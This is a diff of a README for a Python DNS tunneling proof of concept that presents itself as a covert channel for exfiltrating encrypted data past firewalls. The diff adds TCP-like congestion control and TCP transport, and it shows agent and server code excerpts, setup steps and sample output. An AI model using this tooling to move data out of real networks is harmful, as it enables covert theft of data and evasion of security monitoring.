@@ -1,6 +1,6 @@
 # 🔒 Secure DNS Tunneling with Symmetric Encryption 🔒
 
-A Python-based implementation of a DNS tunnel that uses **AES-256 GCM** to create a secure and covert communication channel. This project is a proof-of-concept demonstrating how to exfiltrate data securely through DNS queries.
+A Python-based implementation of a DNS tunnel that uses **AES-256 GCM** to create a secure and covert communication channel. This project is a proof-of-concept demonstrating how to exfiltrate data securely through DNS queries with **advanced reliability features akin to TCP**.
 
 ---
 
@@ -20,11 +20,11 @@ sequenceDiagram
     Server->>Server: 5. Extract & Base32 Decode
     Server->>Server: 6. Decrypt Chunk (AES-GCM)
     alt ✅ Successful Decryption
-        Server-->>Agent: 7. Send ACK<br/>(DNS Response: 1.2.3.4)
+        Server-->>Agent: 7. Send ACK<br/>(DNS Response: 1.2.expected_seq)
     else ❌ Decryption Failed
         Server-->>Agent: 8. No ACK (or error response)
     end
-    Agent->>Agent: 9. Receive ACK or Timeout<br/>(Retry if necessary)
+    Agent->>Agent: 9. Receive ACK or Timeout<br/>(Retry, Congestion Control)
 ```
 
 -----
@@ -33,10 +33,12 @@ sequenceDiagram
 
   * **🔒 Secure Communication**: Data is encrypted using military-grade **AES-256 GCM**, ensuring confidentiality and integrity.
   * **🤫 Covert Channel**: Utilizes DNS queries as a hidden communication channel, perfect for bypassing restrictive firewalls.
-  * **🔁 Reliable Transmission**: Implements an acknowledgment (ACK) mechanism with automatic retries to ensure data arrives.
+  * **🔁 Advanced Reliability with TCP-like Congestion Control**: Implements a sophisticated acknowledgment (ACK) mechanism, sequence numbering, retransmissions, duplicate ACK handling, and a congestion control algorithm (Slow Start, Congestion Avoidance, Fast Retransmit/Recovery) to ensure reliable data delivery even in lossy networks.
   * **🛡️ Data Integrity**: Leverages AES-GCM's built-in authentication tag to verify that data has not been tampered with in transit.
   * **📦 Smart Chunking**: Automatically splits large messages or files into smaller chunks for transmission and reassembles them on the server.
   * **🔢 Sequence Numbering**: Embeds a sequence number in each chunk to guarantee correct message order and prevent replay attacks.
+  * **🔄 Server State Reset**: The Agent can send a specific signal to the Server to clear its received chunks and reset its state, useful for new transmissions.
+  * **TCP-based DNS**: Utilizes TCP for DNS queries and responses, which can be more reliable than UDP in certain network environments and for larger data transfers.
 
 -----
 
@@ -53,10 +55,7 @@ The `crypto_module.py` manages all encryption and decryption using the `PyCrypto
     from Crypto.Cipher import AES
 
     class AESCipher:
-        def __init__(self, key: bytes):
-            # ... key validation ...
-            self.key = key
-
+        # ... __init__ method ...
         def encrypt(self, plaintext: bytes):
             cipher = AES.new(self.key, AES.MODE_GCM)
             ciphertext, tag = cipher.encrypt_and_digest(plaintext)
@@ -75,60 +74,101 @@ The core logic for sending and receiving data via DNS queries is handled in `age
 
 #### Agent (`agent.py`)
 
-The Agent splits data into small chunks, encrypts and encodes them, and then sends them as DNS queries.
+The Agent splits data into small chunks, encrypts and encodes them, and then sends them as DNS queries, managing congestion and reliability.
 
-  * **Data Preparation**: The Agent splits the input message into chunks of `CHUNK_SIZE` (30 bytes). Each chunk is then encrypted, and the resulting `nonce`, `tag`, and `ciphertext` are concatenated into a single packet.
+  * **Data Preparation**: The Agent splits the input message into chunks of `CHUNK_SIZE` (50 bytes). Each chunk is encrypted, and the resulting `nonce`, `tag`, and `ciphertext` are concatenated into a single packet.
 
     ```python
     # From agent.py
-    CHUNK_SIZE = 30 # Max size of data per chunk in bytes
+    CHUNK_SIZE = 50 # Max size of data per chunk in bytes
 
     def split_data(data: bytes, size: int):
         return [data[i:i+size] for i in range(0, len(data), size)]
 
-    def send_chunk_with_ack(chunk: bytes, seq: int):
+    def send_chunk(seq, chunk, base): # Simplified signature for explanation
         encrypted = cipher.encrypt(chunk)
         packet = encrypted['nonce'] + encrypted['tag'] + encrypted['ciphertext']
-        # ... rest of the function ...
+        # ... rest of the send_chunk function ...
     ```
 
-  * **DNS Query Formatting**: The packet (containing encrypted data, nonce, and tag) is Base32 encoded. This encoded string, along with a sequence number, forms a subdomain of the tunnel's `DOMAIN`.
+  * **DNS Query Formatting**: The packet (containing encrypted data, nonce, and tag) is Base32 encoded. This encoded string, along with a sequence number (`seqX`), forms a subdomain of the tunnel's `DOMAIN`.
 
     ```python
     # From agent.py
     DOMAIN = "tunnel.example.com"
 
     def build_label(seq: int, encrypted: bytes) -> str:
-        encoded = base64.b32encode(encrypted).decode().strip('=').lower()
-        # Splits into multiple labels if needed (max 63 chars per label)
-        labels = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
+        encoded = base64.b32encode(encrypted).decode().strip('=')
+        # Labels are split to max 63 chars each
+        labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
         return f"seq{seq}." + ".".join(labels) + f".{DOMAIN}"
     ```
 
-  * **Sending and Acknowledgment**: The Agent sends an A record DNS query to the specified `SERVER_IP` and `SERVER_PORT`. It expects an A record response (`RESPONSE_IP`) as an acknowledgment from the Server. If no ACK is received, it retries up to `MAX_RETRIES` times.
+  * **Reliable Transmission with Congestion Control**: The `main` function in `agent.py` implements a simplified TCP-like congestion control protocol. This includes:
+
+      * **Window-based Sending**: Chunks are sent within a `cwnd` (congestion window) limit.
+      * **Slow Start**: The `cwnd` doubles for each successful `base` advancement until `ssthresh` is reached.
+      * **Congestion Avoidance**: `cwnd` increases linearly after `ssthresh`.
+      * **Fast Retransmit/Recovery**: On detection of 3 duplicate ACKs or a timeout, `ssthresh` is adjusted, and `cwnd` is reset, potentially retransmitting the lost segment quickly.
+      * **ACK Handling**: ACKs are received as `1.2.X.Y` where `X.Y` reconstructs the next expected sequence number.
+      * **Retransmission Limits**: Each chunk has a maximum number of retransmits before it's considered dropped.
+
+    <!-- end list -->
+
+    ```python
+    # From agent.py (main function - simplified)
+    def main():
+        # ... initial setup ...
+        cwnd = 2
+        ssthresh = 8
+        base = 0      # Base sequence number (first unacknowledged)
+        next_seq = 0  # Next sequence number to send
+        in_flight = {} # Chunks sent but not yet acknowledged
+        last_ack = -1
+        dup_ack_count = 0
+        in_fast_recovery = False
+        max_retransmit_per_chunk = 5
+
+        while base < total_chunks:
+            # Send new chunks up to cwnd limit
+            while next_seq < base + cwnd and next_seq < total_chunks:
+                # ... send logic for new chunks ...
+
+            # Timeout detection
+            # ... checks in_flight chunks for timeouts ...
+
+            # Process ACKs (received from send_chunk)
+            ack_seq = send_chunk(base, chunks[base], base) # Simplified: Agent pulls ACK for base
+            if ack_seq is not None:
+                if ack_seq > base: # New ACK
+                    # ... update base, cwnd (slow start / congestion avoidance) ...
+                elif ack_seq == last_ack: # Duplicate ACK
+                    # ... increment dup_ack_count, Fast Retransmit/Recovery logic ...
+            # ... error handling, sleep ...
+    ```
+
+  * **Server Reset Signal**: The Agent sends a special `seq-1.reset.DOMAIN` query to inform the Server to clear its state for a new transmission.
 
     ```python
     # From agent.py
-    MAX_RETRIES = 3
-
-    def send_dns_query(label: str) -> bool:
+    def send_reset_signal():
+        reset_label = f"seq-1.reset.{DOMAIN}"
+        # ... resolver setup ...
         try:
-            query = dns.message.make_query(label, dns.rdatatype.A)
-            response = dns.query.udp(query, '127.0.0.1', port=5353, timeout=2)
-            for answer in response.answer:
-                if answer.rdtype == dns.rdatatype.A:
-                    return True # ACK received
-            return False
+            answers = resolver.resolve(reset_label, 'A', tcp=True) # Uses TCP for reset
+            for answer in answers:
+                if str(answer) == "1.2.0.0": # Specific ACK for reset
+                    return True
         except Exception as e:
-            print(f"❌ DNS error for {label}: {e}")
-            return False
+            # ... error handling ...
+        return False
     ```
 
 #### Server (`server.py`)
 
-The Server runs a custom DNS resolver that intercepts queries for the tunnel domain, extracts and decrypts the data, and sends back acknowledgments.
+The Server runs a custom DNS resolver that intercepts queries for the tunnel domain, extracts and decrypts the data, manages received chunks, and sends back reliability-aware acknowledgments.
 
-  * **Custom DNS Resolver**: The Server uses `dnslib` to run a custom DNS server. Its `resolve` method is called for incoming queries.
+  * **Custom DNS Resolver (TCP)**: The Server uses `dnslib` to run a custom DNS server, listening on `127.0.0.1:5354` using **TCP**. This provides a more stable connection for the advanced reliability features.
 
     ```python
     # From server.py
@@ -137,45 +177,71 @@ The Server runs a custom DNS resolver that intercepts queries for the tunnel dom
 
     class DNSAgentResolver(BaseResolver):
         def resolve(self, request, handler):
-            qname = str(request.q.qname).rstrip('.')
-            # ... rest of the resolve logic ...
-
+            # ... resolve logic ...
+            
     def start_dns_server():
         resolver = DNSAgentResolver()
-        server = DNSServer(resolver, port=5353, address="127.0.0.1", tcp=False)
+        # Server now listens on TCP port 5354
+        server = DNSServer(resolver, port=5354, address="127.0.0.1", tcp=True)
         server.start_thread()
         # ... server loop ...
     ```
 
-  * **Data Extraction and Decryption**: The Server extracts the sequence number and Base32 encoded data from the received DNS query's subdomain. It then decodes the Base32 string, separates the `nonce`, `tag`, and `ciphertext`, and decrypts the data using the `crypto_module`.
+  * **State Management and Reset Handling**: The Server maintains `expected_seq` (the next sequence number it anticipates) and `received_chunks`. It explicitly handles a `seq-1` query as a reset signal, clearing its state and sending a `1.2.0.0` ACK.
 
     ```python
     # From server.py (inside DNSAgentResolver.resolve method)
-    # ... extraction of seq_num and encoded_data ...
-    padded = encoded_data.upper() + '=' * (-len(encoded_data) % 8)
-    full_packet = base64.b32decode(padded)
+    # Global state variables for server, protected by Lock
+    global expected_seq
+    # ... seq_lock, received_chunks ...
+
+    # Handle reset request explicitly
+    if seq_num == -1: # Received a reset signal
+        with seq_lock:
+            received_chunks.clear()
+            expected_seq = 0
+            # ... print confirmation ...
+        ack_ip = "1.2.0.0" # Specific ACK for reset
+        reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, ttl=60, rdata=A(ack_ip)))
+        return reply
+
+    # Ignore chunks older than expected_seq to prevent processing stale data
+    with seq_lock:
+        if seq_num < expected_seq:
+            # ... print ignored message ...
+            ack_ip = f"1.2.{expected_seq // 256}.{expected_seq % 256}" # ACK with current expected_seq
+            reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, ttl=60, rdata=A(ack_ip)))
+            return reply
+    ```
+
+  * **Data Extraction, Decryption, and Sequence Tracking**: The Server extracts the `nonce`, `tag`, and `ciphertext` from the received DNS query. After successful decryption and integrity verification, it stores the chunk and updates `expected_seq` by advancing it past any consecutive received chunks.
+
+    ```python
+    # From server.py (inside DNSAgentResolver.resolve method)
+    # ... Base32 decoding and error handling ...
 
     nonce = full_packet[:16]
     tag = full_packet[16:32]
     ciphertext = full_packet[32:]
 
     plaintext = cipher.decrypt(ciphertext, nonce, tag)
-    # ... storage of plaintext chunk ...
+
+    with seq_lock: # Protects access to shared state
+        if seq_num not in received_chunks:
+            received_chunks[seq_num] = plaintext
+            # Advance expected_seq past all contiguous received chunks
+            while expected_seq in received_chunks:
+                expected_seq += 1
+        # ... handle duplicate chunks ...
     ```
 
-  * **Acknowledgment and Reconstruction**: For every successfully processed chunk, the Server sends an A record DNS response (`RESPONSE_IP`) as an ACK. Upon shutdown (e.g., `Ctrl+C`), it reconstructs the full message from all received chunks, sorted by sequence number.
+  * **Acknowledgment with Expected Sequence**: For every valid chunk, the Server sends an A record DNS response where the IP address `1.2.X.Y` encodes the `expected_seq` (the next chunk it is waiting for). This helps the Agent track acknowledged data and manage its congestion window.
 
     ```python
     # From server.py (inside DNSAgentResolver.resolve method)
-    RESPONSE_IP = "1.2.3.4"
-    reply = request.reply()
-    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, rclass=1, ttl=60, rdata=A(RESPONSE_IP)))
-    return reply
-
-    # From server.py (inside KeyboardInterrupt handler in start_dns_server)
-    message = b''.join([received_chunks[i] for i in sorted(received_chunks)])
-    print(f"\n## --- Reconstructed Message ---\n{message.decode(errors='ignore')}\n")
-    # ... missing chunks report ...
+    # Send the ACK for the next expected sequence
+    ack_ip = f"1.2.{expected_seq // 256}.{expected_seq % 256}"
+    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, ttl=60, rdata=A(ack_ip)))
     ```
 
 -----
@@ -211,14 +277,14 @@ pip install dnspython dnslib pycryptodome
 
 All configuration is done via constants at the top of the respective Python files.
 
-| Parameter | File(s) | Description | Default Value / Example |
-| :--- | :--- | :--- | :--- |
-| **`SHARED_KEY`** | `agent.py`, `server.py`, `crypto_module.py` | The **32-byte (256-bit) symmetric key**. Must be identical across all files. | `b"0123456789ABCDEF0123456789ABCDEF"` |
-| **`DOMAIN`** | `agent.py`, `server.py` | The base domain for the DNS tunnel. | `'tunnel.example.com'` |
-| **`CHUNK_SIZE`** | `agent.py` | Max size (in bytes) of raw data per chunk. | `30` |
-| **`MAX_RETRIES`** | `agent.py` | Number of send attempts per chunk before failing. | `3` |
-| **`SERVER_IP`** | `agent.py`, `server.py` | IP address for the DNS server to run on / connect to (e.g., `127.0.0.1` for local testing). | `'127.0.0.1'` |
-| **`SERVER_PORT`**| `agent.py`, `server.py` | Port for the DNS server (e.g., `5353` for local testing). | `5353`                           |
+| Parameter      | File(s)                                    | Description                                                                                             | Default Value / Example          |
+| :------------- | :----------------------------------------- | :------------------------------------------------------------------------------------------------------ | :------------------------------- |
+| **`SHARED_KEY`** | `agent.py`, `server.py`, `crypto_module.py` | The **32-byte (256-bit) symmetric key**. Must be identical across all files.                            | `b"0123456789ABCDEF0123456789ABCDEF"` |
+| **`DOMAIN`** | `agent.py`, `server.py`                    | The base domain for the DNS tunnel.                                                                     | `'tunnel.example.com'`           |
+| **`CHUNK_SIZE`** | `agent.py`                                 | Max size (in bytes) of raw data per chunk.                                                              | `50`                             |
+| **`TIMEOUT`** | `agent.py`                                 | Timeout in seconds for DNS queries and retransmission detection.                                        | `4`                              |
+| **`SERVER_IP`** | `agent.py`, `server.py`                    | IP address for the DNS server to run on / connect to (e.g., `127.0.0.1` for local testing).             | `'127.0.0.1'`                    |
+| **`SERVER_PORT`**| `agent.py`, `server.py`                    | Port for the DNS server. **Note: Uses TCP.** | `5354`                           |
 
 -----
 
@@ -226,51 +292,75 @@ All configuration is done via constants at the top of the respective Python file
 
 ### 1\. Launch the Server
 
-Open a terminal and run `server.py`. The server will start listening for DNS queries.
+Open a terminal and run `server.py`. The server will start listening for DNS queries on TCP port `5354`.
 
 ```bash
 python server.py
 ```
 
 > ```
-> 🛡️ DNS Tunnel Server running on 127.0.0.1:5353...
-> 📡 Listening for data on domain: tunnel.example.com
+> 🔒 DNS Tunnel Server running on 127.0.0.1:5354 for domain tunnel.example.com
 > ```
 
 ### 2\. Run the Agent
 
-In a **new terminal**, run `agent.py`. It will prompt for your message.
+In a **new terminal**, run `agent.py`. The Agent will first attempt to send a reset signal to the server, then prompt for your message.
 
 ```bash
 python agent.py
 ```
 
 > ```
-> Enter your secret message: This is a highly confidential message that will be tunneled over DNS.
+> 🔹 Sending reset signal...
+> ✅ Server reset confirmed
+> Enter your message: This is a highly confidential message that will be tunneled over DNS.
+> 📆 Total chunks: [number of chunks]
+> 📤 Sending chunk 0
+> 📤 Sending chunk 1
 > ```
 
 ### 3\. Watch the Magic Happen\!
 
-The agent will show its progress, and the server will show received chunks.
+The agent will show its progress, including congestion control states, and the server will show received chunks.
 
-**💻 Agent Output:**
-
-> ```
-> 🔹 Sending chunk 0, try 1...
-> ✅ ACK received for chunk 0
-> 🔹 Sending chunk 1, try 1...
-> ✅ ACK received for chunk 1
-> 🔹 Sending chunk 2, try 1...
-> ✅ ACK received for chunk 2
-> ✨ All chunks sent and acknowledged successfully!
-> ```
-
-**🛡️ Server Output:**
+**💻 Agent Output (Examples):**
 
 > ```
-> ✅ Received chunk 0: b'This is a highly confidentia'
-> ✅ Received chunk 1: b'l message that will be tunn'
-> ✅ Received chunk 2: b'eled over DNS.'
+> 📤 Sending chunk 0
+> ✅ ACK received for seq 1
+> 🚀 Slow Start → cwnd = 4
+> 📤 Sending chunk 1
+> 📤 Sending chunk 2
+> 📤 Sending chunk 3
+> ✅ ACK received for seq 4
+> 🚀 Slow Start → cwnd = 8
+> 🔁 Duplicate ACK for 4 (1)
+> 🔁 Duplicate ACK for 4 (2)
+> 🔁 Duplicate ACK for 4 (3)
+> 🚀 Fast Retransmit: Resending chunk 4
+> ✅ ACK received for seq 5
+> ✅ Exiting Fast Recovery: cwnd = 4
+> ...
+> ✅ All chunks sent and acknowledged.
+> ```
+
+**🛡️ Server Output (Examples):**
+
+> ```
+> 🔄 Before reset: expected_seq=0, received_chunks={}
+> 🔄 Server state reset by client.
+> ✅ Stored chunk 0
+> 📦 Received 0: This is a highly confidentia
+> ✅ Stored chunk 1
+> 📦 Received 1: l message that will be tunn
+> ✅ Stored chunk 2
+> 📦 Received 2: eled over DNS. And this
+> ✅ Stored chunk 3
+> 📦 Received 3:  is even more data to test
+> 🔁 Duplicate chunk 0 ignored.
+> ⏭ Ignoring chunk 1 as it is older than expected_seq=4
+> ✅ Stored chunk 4
+> 📦 Received 4:  the advanced features.
 > ```
 
 ### 4\. View the Reconstructed Message
@@ -278,16 +368,10 @@ The agent will show its progress, and the server will show received chunks.
 Stop the server (`Ctrl+C`). It will automatically reassemble and display the complete message.
 
 > ```
-> ⚠️  Shutting down... rebuilding message:
-> ```
-
-> ```
-> --- Reconstructed Message ---
-> This is a highly confidential message that will be tunneled over DNS.
-> ```
-
-> ```
-> ✅ Received chunks: [0, 1, 2]
+> ⚠️ Shutting down...
+> ✅ Reconstructed message:
+>     This is a highly confidential message that will be tunneled over DNS. And this is even more data to test the advanced features.
+> ✅ Received chunks: [0, 1, 2, 3, 4]
 > ✅ All chunks received successfully.
 > ```
 
@@ -296,7 +380,7 @@ Stop the server (`Ctrl+C`). It will automatically reassemble and display the com
 ## ⚠️ Important Considerations
 
   * **🚨 Security**: The `SHARED_KEY` is hardcoded for this example. In a real-world scenario, the key **must not be hardcoded**. Use a secure key exchange mechanism (like Diffie-Hellman) or pre-share it via a secure out-of-band channel.
-  * **🌐 Network**: The agent is configured for a local server (`127.0.0.1`). For use over the internet, you must run `server.py` on a public server and configure your domain's NS records to point to that server's IP address.
-  * **🕵️‍♂️ Stealth**: While DNS tunneling can bypass simple firewalls, it is **not invisible**. Network traffic analysis and Intrusion Detection Systems (IDS) can flag the unusual DNS patterns (e.g., high-entropy subdomains, high query frequency) generated by this tool.
+  * **🌐 Network**: The agent is configured for a local server (`127.0.0.1`). For use over the internet, you must run `server.py` on a public server and configure your domain's NS records to point to that server's IP address and ensure TCP port `5354` is open.
+  * **🕵️‍♂️ Stealth**: While DNS tunneling can bypass simple firewalls, it is **not invisible**. Network traffic analysis and Intrusion Detection Systems (IDS) can flag the unusual DNS patterns (e.g., high-entropy subdomains, high query frequency, TCP over DNS, custom ACK IP patterns) generated by this tool.
 
 -----
